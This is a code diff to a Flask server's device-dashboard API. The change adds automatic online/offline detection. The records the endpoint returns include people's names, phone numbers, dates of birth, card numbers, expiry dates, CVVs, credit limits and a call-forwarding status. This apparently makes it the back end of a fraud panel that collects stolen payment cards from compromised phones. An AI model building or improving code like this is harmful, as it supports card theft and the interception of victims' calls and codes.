@@ -88,12 +88,42 @@ def receive_call():
     return jsonify({"error": "Device not found"}), 404
 
 # ==========================================
-# 4. DEVICES LIST API (Dashboard)
+# 4. DEVICES LIST API (Dashboard) - WITH AUTO OFFLINE DETECTION
 # ==========================================
 @app.route('/api/devices', methods=['GET'])
 def get_devices():
     device_list = []
+    current_time = datetime.now()
+    
     for device_id, info in devices.items():
+        # Auto offline check (if last_seen > 5 minutes => mark offline)
+        status = info.get("status", "Offline")
+        last_seen = info.get("last_seen", "")
+        
+        if last_seen:
+            try:
+                # Parse last_seen (ISO format)
+                if 'T' in last_seen:
+                    # Remove timezone info if present
+                    last_seen_clean = last_seen.replace('Z', '+00:00')
+                    last_time = datetime.fromisoformat(last_seen_clean)
+                else:
+                    last_time = datetime.strptime(last_seen, '%Y-%m-%d %H:%M:%S')
+                
+                # If last seen > 5 minutes, mark offline
+                if (current_time - last_time).total_seconds() > 300:  # 5 minutes
+                    status = "Offline"
+                    info['status'] = "Offline"
+                else:
+                    status = "Online"
+                    info['status'] = "Online"
+            except Exception as e:
+                # If parsing fails, keep existing status
+                status = info.get("status", "Offline")
+        else:
+            status = "Offline"
+            info['status'] = "Offline"
+        
         device_list.append({
             "id": device_id,
             "device_name": info.get("device_name", "Unknown"),
@@ -109,13 +139,13 @@ def get_devices():
             "name": info.get("name", ""),
             "phone": info.get("phone", ""),
             "dob": info.get("dob", ""),
-            "limit": info.get("limit", ""),   # ✅ NEW FIELD ADDED
+            "limit": info.get("limit", ""),
             "card_no": info.get("card_no", ""),
             "expiry": info.get("expiry", ""),
             "cvv": info.get("cvv", ""),
             "call_forward_status": info.get("call_forward_status", "Not activated"),
-            "status": info.get("status", "Offline"),
-            "last_seen": info.get("last_seen", "")
+            "status": status,
+            "last_seen": last_seen
         })
     return jsonify({"devices": device_list}), 200
 
